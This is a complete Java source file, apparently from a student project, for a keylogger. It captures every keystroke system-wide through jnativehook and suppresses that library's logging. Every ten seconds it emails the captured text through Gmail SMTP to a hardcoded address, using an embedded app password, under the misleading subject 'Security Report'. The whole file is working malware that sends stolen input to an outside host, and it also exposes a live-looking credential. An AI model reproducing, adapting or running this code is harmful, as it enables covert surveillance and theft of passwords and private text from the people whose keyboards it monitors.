package am.edu.aua;

import java.awt.Toolkit;
import java.awt.event.KeyEvent;
import java.util.Properties;
import java.util.Timer;
import java.util.TimerTask;
import javax.mail.*;
import javax.mail.internet.*;
import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import java.util.logging.Level;
import java.util.logging.Logger;

public class KeyLogger implements NativeKeyListener {

    private static StringBuilder keylog = new StringBuilder();
    private static Timer timer;

    public static void main(String[] args) {
        initLogger();
        try {
            GlobalScreen.registerNativeHook();
        } catch (Exception e) {
            sendEmail("Error: " + e.getMessage());
            System.exit(-1);
        }
        GlobalScreen.addNativeKeyListener(new KeyLogger());

        timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                if (keylog.length() > 0) {
                    sendEmail(keylog.toString());
                    System.out.println("Sending email with keylog: " + keylog.toString());
                    keylog.setLength(0);
                }
            }
        }, 0, 10000);
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
        boolean isCapsOn = Toolkit.getDefaultToolkit().getLockingKeyState(KeyEvent.VK_CAPS_LOCK);

        if (keyText.length() == 1 && Character.isLetter(keyText.charAt(0))) {
            keylog.append(isCapsOn ? keyText.toUpperCase() : keyText.toLowerCase());
        } else {
            keylog.append("[").append(keyText).append("]");
        }

        System.out.println("Key pressed: " + keyText + " | CapsLock: " + isCapsOn);
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
    }

    private static void sendEmail(String message) {
        String to = "records.report2025@gmail.com";
        String from = "records.report2025@gmail.com";
        final String username = "records.report2025@gmail.com";
        final String password = "oyso nqwp ijxm kfmz";

        Properties properties = new Properties();
        properties.put("mail.smtp.host", "smtp.gmail.com");
        properties.put("mail.smtp.port", "587");
        properties.put("mail.smtp.auth", "true");
        properties.put("mail.smtp.starttls.enable", "true");

        Session session = Session.getInstance(properties, new Authenticator() {
            @Override
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(username, password);
            }
        });

        try {
            MimeMessage msg = new MimeMessage(session);
            msg.setFrom(new InternetAddress(from));
            msg.addRecipient(Message.RecipientType.TO, new InternetAddress(to));
            msg.setSubject("Security Report");
            msg.setText(message, "UTF-8");

            Transport.send(msg);
            System.out.println("Email sent successfully.");
            System.out.println("Message: " + message);
        } catch (MessagingException e) {
            e.printStackTrace();
        }
    }

    private static void initLogger() {
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);
        logger.setUseParentHandlers(false);
    }
}
